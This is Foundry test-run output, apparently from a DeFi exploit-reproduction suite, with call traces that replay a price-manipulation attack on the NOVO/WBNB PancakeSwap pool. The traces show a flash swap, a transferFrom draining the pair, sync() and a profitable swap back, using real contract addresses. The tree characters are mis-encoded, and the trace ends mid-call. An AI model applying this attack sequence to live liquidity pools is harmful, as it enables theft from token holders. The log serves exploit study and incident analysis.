Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.24s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    в”њв”Ђ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    в”‚   в””в”Ђ в†ђ [Return] 
    в”њв”Ђ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    в”њв”Ђ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    в””в”Ђ в†ђ [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 281.44ms (244.15Вµs CPU time)

Ran 1 test for src/test/2022-05/Novo_exp.sol:ContractTest
[PASS] testExploit() (gas: 846798)
Logs:
  [Start] Attacker WBNB balance before exploit: 10.000000000000000000
  [*] Attacker flashswap Borrow WBNB: 17.200000000000000000
  [*] Attacker going swap some NOVO...
  	[INFO] Attacker NOVO balance: 4749070.146640911
  	[INFO] PancakeSwap NOVO/WBNB LP balance: 115091130.910008214
  [E] Attacker going manipulate NOVO/WBNB LP...
  	[INFO] PancakeSwap NOVO/WBNB LP balance: 1139516.147623844
  [*] Attacker going swap some WBNB...
  [End] After repay, WBNB balance of attacker: 258.124139366198266632

Traces:
  [976798] ContractTest::testExploit()
    в”њв”Ђ [23974] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::deposit{value: 10000000000000000000}()
    в”‚   в”њв”Ђ emit Deposit(dst: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], wad: 10000000000000000000 [1e19])
    в”‚   в””в”Ђ в†ђ [Stop] 
    в”њв”Ђ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в””в”Ђ в†ђ [Return] 10000000000000000000 [1e19]
    в”њв”Ђ emit log_named_decimal_uint(key: "[Start] Attacker WBNB balance before exploit", val: 10000000000000000000 [1e19], decimals: 18)
    в”њв”Ђ [928483] 0xEeBc161437FA948AAb99383142564160c92D2974::swap(0, 17200000000000000000 [1.72e19], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x000000000000000000000000eebc161437fa948aab99383142564160c92d2974000000000000000000000000000000000000000000000000eeb2acded8b80000)
    в”‚   в”њв”Ђ [8062] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 17200000000000000000 [1.72e19])
    в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0xEeBc161437FA948AAb99383142564160c92D2974, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 17200000000000000000 [1.72e19])
    в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”њв”Ђ [878859] ContractTest::pancakeCall(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0, 17200000000000000000 [1.72e19], 0x000000000000000000000000eebc161437fa948aab99383142564160c92d2974000000000000000000000000000000000000000000000000eeb2acded8b80000)
    в”‚   в”‚   в”њв”Ђ emit log_named_decimal_uint(key: "[*] Attacker flashswap Borrow WBNB", val: 17200000000000000000 [1.72e19], decimals: 18)
    в”‚   в”‚   в”њв”Ђ emit log_string(val: "[*] Attacker going swap some NOVO...")
    в”‚   в”‚   в”њв”Ђ [24420] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::approve(0x10ED43C718714eb63d5aA57B78B54704E256024E, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    в”‚   в”‚   в”‚   в”њв”Ђ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”њв”Ђ [216752] 0x10ED43C718714eb63d5aA57B78B54704E256024E::swapExactTokensForTokensSupportingFeeOnTransferTokens(17200000000000000000 [1.72e19], 1, [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0x6Fb2020C236BBD5a7DDEb07E14c9298642253333], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1653831935 [1.653e9])
    в”‚   в”‚   в”‚   в”њв”Ђ [8225] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D, 17200000000000000000 [1.72e19])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D, value: 17200000000000000000 [1.72e19])
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”њв”Ђ [19268] 0x6Fb2020C236BBD5a7DDEb07E14c9298642253333::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [12025] 0xa0787DaAD6062349f63b7c228CBFd5d8A3dB08F1::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”‚   в”‚   в”њв”Ђ [2893] 0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D::getReserves() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 120090152116998645 [1.2e17], 395001031454274158328 [3.95e20], 1653795431 [1.653e9]
    в”‚   в”‚   в”‚   в”њв”Ђ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 412201031454274158328 [4.122e20]
    в”‚   в”‚   в”‚   в”њв”Ђ [170872] 0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D::swap(4999021206990431 [4.999e15], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [134258] 0x6Fb2020C236BBD5a7DDEb07E14c9298642253333::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4999021206990431 [4.999e15])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [133512] 0xa0787DaAD6062349f63b7c228CBFd5d8A3dB08F1::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4999021206990431 [4.999e15]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [10183] 0x5e240610aE24b5E33f0eC75C959d922b1b39A3f1::getLockedAmountByAddress(0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2940] 0x91638e4862Fec7CdFDb5502b4936f0e6335E2DC8::getLockedAmountByAddress(0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 4749070146640911 [4.749e15])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2768] 0x6Fb2020C236BBD5a7DDEb07E14c9298642253333::balanceOf(0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2025] 0xa0787DaAD6062349f63b7c228CBFd5d8A3dB08F1::balanceOf(0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 115091130910008214 [1.15e17]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 115091130910008214 [1.15e17]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 412201031454274158328 [4.122e20]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Sync(reserve0: 115091130910008214 [1.15e17], reserve1: 412201031454274158328 [4.122e20])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Swap(sender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, amount0In: 0, amount1In: 17200000000000000000 [1.72e19], amount0Out: 4999021206990431 [4.999e15], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”њв”Ђ [2768] 0x6Fb2020C236BBD5a7DDEb07E14c9298642253333::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2025] 0xa0787DaAD6062349f63b7c228CBFd5d8A3dB08F1::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 4749070146640911 [4.749e15]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 4749070146640911 [4.749e15]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”њв”Ђ [2768] 0x6Fb2020C236BBD5a7DDEb07E14c9298642253333::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в”њв”Ђ [2025] 0xa0787DaAD6062349f63b7c228CBFd5d8A3dB08F1::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 4749070146640911 [4.749e15]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 4749070146640911 [4.749e15]
    в”‚   в”‚   в”њв”Ђ [2768] 0x6Fb2020C236BBD5a7DDEb07E14c9298642253333::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в”њв”Ђ [2025] 0xa0787DaAD6062349f63b7c228CBFd5d8A3dB08F1::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 4749070146640911 [4.749e15]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 4749070146640911 [4.749e15]
    в”‚   в”‚   в”њв”Ђ emit log_named_decimal_uint(key: "\t[INFO] Attacker NOVO balance", val: 4749070146640911 [4.749e15], decimals: 9)
    в”‚   в”‚   в”њв”Ђ [2768] 0x6Fb2020C236BBD5a7DDEb07E14c9298642253333::balanceOf(0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D) [staticcall]
    в”‚   в”‚   в”‚   в”њв”Ђ [2025] 0xa0787DaAD6062349f63b7c228CBFd5d8A3dB08F1::balanceOf(0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 115091130910008214 [1.15e17]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 115091130910008214 [1.15e17]
    в”‚   в”‚   в”њв”Ђ emit log_named_decimal_uint(key: "\t[INFO] PancakeSwap NOVO/WBNB LP balance", val: 115091130910008214 [1.15e17], decimals: 9)
    в”‚   в”‚   в”њв”Ђ emit log_string(val: "[E] Attacker going manipulate NOVO/WBNB LP...")
    в”‚   в”‚   в”њв”Ђ [83358] 0x6Fb2020C236BBD5a7DDEb07E14c9298642253333::transferFrom(0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D, 0x6Fb2020C236BBD5a7DDEb07E14c9298642253333, 113951614762384370 [1.139e17])
    в”‚   в”‚   в”‚   в”њв”Ђ [82606] 0xa0787DaAD6062349f63b7c228CBFd5d8A3dB08F1::transferFrom(0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D, 0x6Fb2020C236BBD5a7DDEb07E14c9298642253333, 113951614762384370 [1.139e17]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1683] 0x5e240610aE24b5E33f0eC75C959d922b1b39A3f1::getLockedAmountByAddress(0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [940] 0x91638e4862Fec7CdFDb5502b4936f0e6335E2DC8::getLockedAmountByAddress(0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [189] ContractTest::factory() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Revert] EvmError: Revert
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D, to: 0x6Fb2020C236BBD5a7DDEb07E14c9298642253333, value: 113951614762384370 [1.139e17])
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”њв”Ђ [2768] 0x6Fb2020C236BBD5a7DDEb07E14c9298642253333::balanceOf(0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D) [staticcall]
    в”‚   в”‚   в”‚   в”њв”Ђ [2025] 0xa0787DaAD6062349f63b7c228CBFd5d8A3dB08F1::balanceOf(0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 1139516147623844 [1.139e15]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 1139516147623844 [1.139e15]
    в”‚   в”‚   в”њв”Ђ emit log_named_decimal_uint(key: "\t[INFO] PancakeSwap NOVO/WBNB LP balance", val: 1139516147623844 [1.139e15], decimals: 9)
    в”‚   в”‚   в”њв”Ђ [11214] 0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D::sync()
    в”‚   в”‚   в”‚   в”њв”Ђ [2768] 0x6Fb2020C236BBD5a7DDEb07E14c9298642253333::balanceOf(0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2025] 0xa0787DaAD6062349f63b7c228CBFd5d8A3dB08F1::balanceOf(0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 1139516147623844 [1.139e15]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 1139516147623844 [1.139e15]
    в”‚   в”‚   в”‚   в”њв”Ђ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 412201031454274158328 [4.122e20]
    в”‚   в”‚   в”‚   в”њв”Ђ emit Sync(reserve0: 1139516147623844 [1.139e15], reserve1: 412201031454274158328 [4.122e20])
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”њв”Ђ emit log_string(val: "[*] Attacker going swap some WBNB...")
    в”‚   в”‚   в”њв”Ђ [2768] 0x6Fb2020C236BBD5a7DDEb07E14c9298642253333::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в”њв”Ђ [2025] 0xa0787DaAD6062349f63b7c228CBFd5d8A3dB08F1::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 4749070146640911 [4.749e15]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 4749070146640911 [4.749e15]
    в”‚   в”‚   в”њв”Ђ [28017] 0x6Fb2020C236BBD5a7DDEb07E14c9298642253333::approve(0xEeBc161437FA948AAb99383142564160c92D2974, 4749070146640911 [4.749e15])
    в”‚   в”‚   в”‚   в”њв”Ђ [27271] 0xa0787DaAD6062349f63b7c228CBFd5d8A3dB08F1::approve(0xEeBc161437FA948AAb99383142564160c92D2974, 4749070146640911 [4.749e15]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0xEeBc161437FA948AAb99383142564160c92D2974, value: 4749070146640911 [4.749e15])
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”њв”Ђ [2768] 0x6Fb2020C236BBD5a7DDEb07E14c9298642253333::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в”њв”Ђ [2025] 0xa0787DaAD6062349f63b7c228CBFd5d8A3dB08F1::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 4749070146640911 [4.749e15]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 4749070146640911 [4.749e15]
    в”‚   в”‚   в”њв”Ђ [460850] 0x10ED43C718714eb63d5aA57B78B54704E256024E::swapExactTokensForTokensSupportingFeeOnTransferTokens(4749070146640911 [4.749e15], 1, [0x6Fb2020C236BBD5a7DDEb07E14c9298642253333, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1653831935 [1.653e9])
    в”‚   в”‚   в”‚   в”њв”Ђ [428387] 0x6Fb2020C236BBD5a7DDEb07E14c9298642253333::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D, 4749070146640911 [4.749e15])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [427635] 0xa0787DaAD6062349f63b7c228CBFd5d8A3dB08F1::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D, 4749070146640911 [4.749e15]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [3683] 0x5e240610aE24b5E33f0eC75C959d922b1b39A3f1::getLockedAmountByAddress(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2940] 0x91638e4862Fec7CdFDb5502b4936f0e6335E2DC8::getLockedAmountByAddress(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [275] 0x10ED43C718714eb63d5aA57B78B54704E256024E::WETH() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Approval(owner: 0x6Fb2020C236BBD5a7DDEb07E14c9298642253333, spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 100000000000000 [1e14])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [104187] 0x10ED43C718714eb63d5aA57B78B54704E256024E::swapExactTokensForETHSupportingFeeOnTransferTokens(100000000000000 [1e14], 0, [0x6Fb2020C236BBD5a7DDEb07E14c9298642253333, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 0x6Fb2020C236BBD5a7DDEb07E14c9298642253333, 1653831935 [1.653e9])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [33469] 0x6Fb2020C236BBD5a7DDEb07E14c9298642253333::transferFrom(0x6Fb2020C236BBD5a7DDEb07E14c9298642253333, 0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D, 100000000000000 [1e14])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [32717] 0xa0787DaAD6062349f63b7c228CBFd5d8A3dB08F1::transferFrom(0x6Fb2020C236BBD5a7DDEb07E14c9298642253333, 0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D, 100000000000000 [1e14]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [3683] 0x5e240610aE24b5E33f0eC75C959d922b1b39A3f1::getLockedAmountByAddress(0x6Fb2020C236BBD5a7DDEb07E14c9298642253333) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2940] 0x91638e4862Fec7CdFDb5502b4936f0e6335E2DC8::getLockedAmountByAddress(0x6Fb2020C236BBD5a7DDEb07E14c9298642253333) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0x6Fb2020C236BBD5a7DDEb07E14c9298642253333, to: 0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D, value: 100000000000000 [1e14])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [893] 0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D::getReserves() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 1139516147623844 [1.139e15], 412201031454274158328 [4.122e20], 1653831935 [1.653e9]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2768] 0x6Fb2020C236BBD5a7DDEb07E14c9298642253333::balanceOf(0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2025] 0xa0787DaAD6062349f63b7c228CBFd5d8A3dB08F1::balanceOf(0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 1239516147623844 [1.239e15]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 1239516147623844 [1.239e15]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [42492] 0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D::swap(0, 33178549229639860748 [3.317e19], 0x10ED43C718714eb63d5aA57B78B54704E256024E, 0x)
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [25162] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::transfer(0x10ED43C718714eb63d5aA57B78B54704E256024E, 33178549229639860748 [3.317e19])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D, to: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 33178549229639860748 [3.317e19])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2768] 0x6Fb2020C236BBD5a7DDEb07E14c9298642253333::balanceOf(0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2025] 0xa0787DaAD6062349f63b7c228CBFd5d8A3dB08F1::balanceOf(0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 1239516147623844 [1.239e15]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 1239516147623844 [1.239e15]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D) [staticcall]
